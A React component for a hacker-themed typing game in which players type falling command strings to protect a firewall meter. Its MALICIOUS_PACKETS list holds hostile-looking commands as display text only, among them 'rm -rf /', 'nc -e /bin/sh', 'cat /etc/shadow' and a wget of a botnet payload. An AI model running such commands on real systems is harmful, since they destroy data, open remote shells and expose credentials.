import { useState, useEffect, useRef, useCallback } from 'react';
import gsap from 'gsap';
import { useTheme } from '../context/ThemeContext';

const MALICIOUS_PACKETS = [
  'rm -rf /', 'sudo chmod 777', 'drop table users;', 
  'nmap -sS -p-', 'curl http://malware.org', 'wget http://botnet.com/payload',
  'ssh root@nexus', 'ping -f 192.168.1.1', 'sqlmap -u', 
  'nc -e /bin/sh', 'chmod +x exploit.sh', 'iptables -F',
  'dd if=/dev/urandom', 'mkfs.ext4 /dev/sda1', 'echo "" > /etc/passwd',
  'chown root:root /bin', 'cat /etc/shadow', 'tail -f /var/log',
  'grep "password"', 'netstat -tuln', 'ls -la /root',
  'history -c', 'passwd root', 'usermod -aG sudo',
  'tar -czvf backup.tar.gz', 'kill -9 1', 'reboot',
  'crontab -e', 'systemctl stop', 'systemctl disable',
  'awk "{print $1}"', 'sed -i s/foo/bar/g', 'find / -name',
  'df -h', 'free -m', 'lsof -i',
  'nslookup dns', 'traceroute 8.8.8.8', 'tcpdump -i eth0',
  'ufw disable', 'ip route add', 'ifconfig eth0 down',
  'docker rm -f', 'docker exec -it', 'kubectl delete pod',
  'ssh-keygen -t rsa', 'chmod 400 key.pem', 'ssh-add key.pem',
  'git config --global', 'git push --force', 'npm install -g',
  'pip install --upgrade', 'python3 -m http.server', 'curl -X POST',
  'jq .credentials', 'aws s3 ls', 'aws iam create',
  'terraform destroy', 'ansible-playbook', 'make clean all'
];

export default function BreachPage() {
  const { isCrimson } = useTheme();
  const [isPlaying, setIsPlaying] = useState(false);
  const [gameOver, setGameOver] = useState(false);
  const [score, setScore] = useState(0);
  const [input, setInput] = useState('');
  const [activePackets, setActivePackets] = useState([]);
  
  const containerRef = useRef(null);
  const gameLoopRef = useRef(null);
  const spawnTimerRef = useRef(null);
  const inputRef = useRef(null);
  const [health, setHealth] = useState(100);

  const startGame = () => {
    setIsPlaying(true);
    setGameOver(false);
    setScore(0);
    setHealth(100);
    setInput('');
    setActivePackets([]);
    if (inputRef.current) inputRef.current.focus();
  };

  const spawnPacket = useCallback(() => {
    const text = MALICIOUS_PACKETS[Math.floor(Math.random() * MALICIOUS_PACKETS.length)];
    const id = Date.now() + Math.random().toString();
    const x = 10 + Math.random() * 70; // 10% to 80% width
    
    setActivePackets(prev => [...prev, { id, text, x, y: 0 }]);
  }, []);

  useEffect(() => {
    if (!isPlaying) return;

    // Spawn packets faster as score increases, but cap at a reasonable rate
    const spawnRate = Math.max(1200, 3000 - (score * 10));
    spawnTimerRef.current = setInterval(spawnPacket, spawnRate);

    // Game loop (physics)
    const fallSpeed = 0.3 + (score * 0.002); // Very slight speed increase based on score
    gameLoopRef.current = setInterval(() => {
      setActivePackets(prev => {
        let newPackets = [];
        let damage = 0;
        let scorePenalty = 0;

        prev.forEach(p => {
          if (p.y > 90) { // Hit the firewall
            damage += 15;
            scorePenalty += 5;
          } else {
            newPackets.push({ ...p, y: p.y + fallSpeed });
          }
        });

        if (damage > 0) {
          setScore(s => Math.max(0, s - scorePenalty));
          setHealth(h => {
            const newHealth = Math.max(0, h - damage);
            if (newHealth === 0) {
              setGameOver(true);
              setIsPlaying(false);
            }
            return newHealth;
          });
        }
        return newPackets;
      });
    }, 50);

    return () => {
      clearInterval(spawnTimerRef.current);
      clearInterval(gameLoopRef.current);
    };
  }, [isPlaying, score, spawnPacket]);

  // Handle Input
  const handleInputChange = (e) => {
    const val = e.target.value;
    setInput(val);

    // Check if input matches any active packet exactly
    const hitIndex = activePackets.findIndex(p => p.text === val);
    if (hitIndex !== -1) {
      // Destroy packet
      const packet = activePackets[hitIndex];
      setActivePackets(prev => prev.filter((_, i) => i !== hitIndex));
      setScore(s => s + 5);
      setInput(''); // clear input
      
      // Explosion effect at packet location could be added here
    }
  };

  // Keep input focused
  useEffect(() => {
    const handleClick = () => { if (isPlaying && inputRef.current) inputRef.current.focus(); };
    window.addEventListener('click', handleClick);
    return () => window.removeEventListener('click', handleClick);
  }, [isPlaying]);

  return (
    <div className="page" ref={containerRef} style={{ display: 'flex', flexDirection: 'column', height: '80vh', overflow: 'hidden' }}>
      <div className="section-header reveal-item" style={{ marginBottom: '24px' }}>
        <div className="section-num">0x0F</div>
        <div className="section-title">Firewall Breach</div>
        <div className="section-line"></div>
      </div>

      <div style={{ flex: 1, position: 'relative', background: 'var(--bg-deep)', border: `1px solid ${isCrimson ? 'var(--accent)' : 'var(--border-subtle)'}`, borderRadius: '12px', overflow: 'hidden', boxShadow: 'inset 0 0 50px rgba(0,0,0,0.8)' }}>
        
        {/* Game UI Header */}
        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, padding: '16px', display: 'flex', justifyContent: 'space-between', zIndex: 10, background: 'rgba(0,0,0,0.5)', borderBottom: '1px solid var(--border-subtle)' }}>
          <div style={{ fontFamily: 'var(--font-mono)', fontSize: '14px', color: 'var(--accent)', fontWeight: 'bold' }}>
            SCORE: {score.toString().padStart(6, '0')}
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <span style={{ fontFamily: 'var(--font-mono)', fontSize: '12px', color: 'var(--text-ghost)' }}>FIREWALL INTEGRITY:</span>
            <div style={{ width: '150px', height: '10px', background: 'rgba(255,255,255,0.1)', borderRadius: '5px', overflow: 'hidden' }}>
              <div style={{ width: `${health}%`, height: '100%', background: health > 30 ? 'var(--accent)' : '#ff3366', transition: 'width 0.2s' }} />
            </div>
            <span style={{ fontFamily: 'var(--font-mono)', fontSize: '12px', color: health > 30 ? 'var(--accent)' : '#ff3366' }}>{health}%</span>
          </div>
        </div>

        {/* Start / Game Over Screens */}
        {(!isPlaying && !gameOver) && (
          <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', zIndex: 20, background: 'rgba(0,0,0,0.8)' }}>
            <h2 style={{ fontFamily: 'var(--font-mono)', fontSize: '24px', color: 'var(--accent)', marginBottom: '16px', letterSpacing: '0.1em' }}>INCOMING BRUTE FORCE ATTACK</h2>
            <p style={{ color: 'var(--text-secondary)', marginBottom: '32px', textAlign: 'center', maxWidth: '400px' }}>
              Malicious payloads are hitting the external firewall. Type the exact command payload and press Enter to neutralize the threat before it breaches the core.
            </p>
            <button className="btn-primary" onClick={startGame}>INITIALIZE DEFENSE</button>
          </div>
        )}

        {gameOver && (
          <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', zIndex: 20, background: 'rgba(255,0,0,0.1)', backdropFilter: 'blur(5px)' }}>
            <h2 style={{ fontFamily: 'var(--font-display)', fontSize: '48px', color: '#ff3366', marginBottom: '8px', fontWeight: 800 }}>SYSTEM BREACHED</h2>
            <p style={{ color: 'var(--text-primary)', marginBottom: '8px', fontFamily: 'var(--font-mono)' }}>FINAL SCORE: {score}</p>
            <p style={{ color: 'var(--text-secondary)', marginBottom: '32px', fontSize: '12px' }}>The payloads successfully bypassed your defenses.</p>
            <button className="btn-ghost" onClick={startGame}>REBOOT FIREWALL</button>
          </div>
        )}

        {/* The Game Area (Falling Packets) */}
        {isPlaying && (
          <div style={{ position: 'absolute', inset: '60px 0 60px 0', overflow: 'hidden' }}>
            {activePackets.map(p => (
              <div key={p.id} style={{
                position: 'absolute',
                left: `${p.x}%`,
                top: `${p.y}%`,
                background: 'rgba(255,51,102,0.1)',
                border: '1px solid #ff3366',
                color: '#ff3366',
                padding: '4px 12px',
                borderRadius: '4px',
                fontFamily: 'var(--font-mono)',
                fontSize: '14px',
                whiteSpace: 'nowrap',
                boxShadow: '0 0 15px rgba(255,51,102,0.2)'
              }}>
                {p.text}
              </div>
            ))}
          </div>
        )}

        {/* Input Bar (The Player) */}
        <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, padding: '16px', background: 'rgba(0,0,0,0.8)', borderTop: `1px solid ${isCrimson ? 'var(--accent)' : 'var(--border-subtle)'}`, display: 'flex', alignItems: 'center', gap: '16px', zIndex: 10 }}>
          <span style={{ color: 'var(--accent)', fontFamily: 'var(--font-mono)' }}>root@firewall:~#</span>
          <input
            ref={inputRef}
            type="text"
            value={input}
            onChange={handleInputChange}
            disabled={!isPlaying}
            style={{
              flex: 1,
              background: 'transparent',
              border: 'none',
              outline: 'none',
              color: 'var(--text-primary)',
              fontFamily: 'var(--font-mono)',
              fontSize: '18px'
            }}
            placeholder={isPlaying ? "Type payload to neutralize..." : ""}
          />
        </div>
      </div>
    </div>
  );
}
